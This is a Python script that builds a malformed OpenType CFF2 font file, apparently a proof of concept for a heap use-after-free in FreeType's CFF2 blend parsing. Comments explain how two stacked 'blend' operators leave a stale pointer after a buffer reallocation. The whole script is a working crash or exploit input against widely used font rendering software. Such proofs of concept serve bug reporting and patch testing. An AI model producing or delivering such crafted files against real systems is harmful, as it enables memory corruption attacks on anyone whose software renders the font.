```
#!/usr/bin/env python3
import struct

def u8(v):  return struct.pack('>B', v)
def u16(v): return struct.pack('>H', v)
def u32(v): return struct.pack('>I', v)

# ---------------- CFF2 table ----------------

# --- private DICT (the payload) ---
#   10  1  blend   1  blend
# blend #1: 1 operand, numBlends=1, lenBV=1 -> 1 blended result pushed on
#           parser->stack, pointing into subFont->blend_stack (5 bytes)
# blend #2: numBlends=1 -> needs 1 operand; the only value on the stack is
#           the stale pointer into blend_stack; growing blend_stack via
#           FT_REALLOC frees the old buffer -> cff_parse_num dereferences
#           the stale pointer -> heap-use-after-free
priv  = u8(139 + 10)        # operand 10
priv += u8(139 + 1)         # numBlends = 1
priv += u8(23)              # blend
priv += u8(139 + 1)         # numBlends = 1
priv += u8(23)              # blend

# --- font DICT: Private(size, offset) ---
def enc3(v):  # 28 hi lo (16-bit integer operand)
    return u8(28) + u16(v)

# --- vstore: format 1, one VarData with zero regions -> lenBV = 1 ---
vstore  = u16(22)                   # totalSize (unused by freetype)
vstore += u16(1)                    # format
vstore += u32(12)                   # regionListOffset (relative to vstore start)
vstore += u16(1)                    # dataCount
vstore += u32(16)                   # dataOffset[0] (relative to vstore start)
vstore += u16(0)                    # axisCount
vstore += u16(0)                    # regionCount
vstore += u16(0)                    # itemCount      (skipped)
vstore += u16(0)                    # shortDeltaCount (skipped)
vstore += u16(0)                    # regionIdxCount -> lenBV = 1
assert len(vstore) == 22

# --- charstrings index: one 1-byte charstring (endchar) ---
cs_data = u8(14)                    # endchar
cs  = u32(1) + u8(1) + u8(1) + u8(1 + len(cs_data)) + cs_data

# --- global subrs index: empty ---
gsubrs = u32(0)

# --- FDArray index: one font DICT ---
fd  = enc3(len(priv)) + enc3(0x456)  # placeholder offset, fixed later
fdi = u32(1) + u8(1) + u8(1) + u8(1 + len(fd)) + fd

hdr = u8(2) + u8(0) + u8(5) + u16(0)  # placeholder topDictLength

# offsets relative to start of CFF2 table
HDR = 5
top_dict_start = HDR
TOP_LEN = len(enc3(0) ) * 3 + 5 + 1 # initial guess, corrected below
top  = enc3(0) + u8(24)             # vstore
top += enc3(0) + u8(17)             # charstrings
top += enc3(0) + u8(12) + u8(0x24)  # fdarray
TOP_LEN = len(top)

off_gsubrs  = HDR + TOP_LEN
off_vstore  = off_gsubrs + len(gsubrs)
off_cs      = off_vstore + len(vstore)
off_fdi     = off_cs + len(cs)
off_priv    = off_fdi + len(fdi)

top = enc3(off_vstore) + u8(24) + \
      enc3(off_cs)     + u8(17) + \
      enc3(off_fdi)    + u8(12) + u8(0x24)
assert len(top) == TOP_LEN

hdr = u8(2) + u8(0) + u8(5) + u16(TOP_LEN)
cff2 = hdr + top + gsubrs + vstore + cs + fdi
cff2 = cff2[:off_priv] + priv + cff2[off_priv + len(priv):] if False else None
# rebuild cff2 properly (priv appended at end)
cff2 = hdr + top + gsubrs + vstore + cs + fdi + priv

# sanity: offsets computed above assumed sizes match
assert off_gsubrs == 5 + TOP_LEN
assert off_vstore == off_gsubrs + 4
assert off_cs     == off_vstore + len(vstore)
assert off_fdi    == off_cs + 8
assert off_priv   == off_fdi + len(fdi)
assert len(cff2)  == off_priv + len(priv)

# ---------------- SFNT wrapper (OTTO) ----------------
tables = [
    (b'CFF2', cff2),
    (b'cmap', b'\x00\x00\x00\x10' + b'\x00' * 12),  # format 0 cmap, 13 bytes... whatever
]
num = len(tables)
# sort by tag
tables.sort(key=lambda t: t[0])

sr = 1
while sr * 2 <= num:
    sr *= 2
search_range   = sr * 16
entry_selector = sr.bit_length() - 1
range_shift    = num * 16 - search_range

sfnt  = b'OTTO'
sfnt += u16(num) + u16(search_range) + u16(entry_selector) + u16(range_shift)

off_dir = 12 + 16 * num
data_off = off_dir
entries = b''
body = b''
for tag, data in tables:
    entries += tag + u32(0) + u32(data_off) + u32(len(data))
    body += data
    data_off += len(data)
    # 4-byte align
    pad = (-len(data)) % 4
    body += b'\x00' * pad
    data_off += pad

sfnt = sfnt + entries + body

with open('/workspace/poc.cff2', 'wb') as f:
    f.write(sfnt)
print('wrote /workspace/poc.cff2, size', len(sfnt))
```

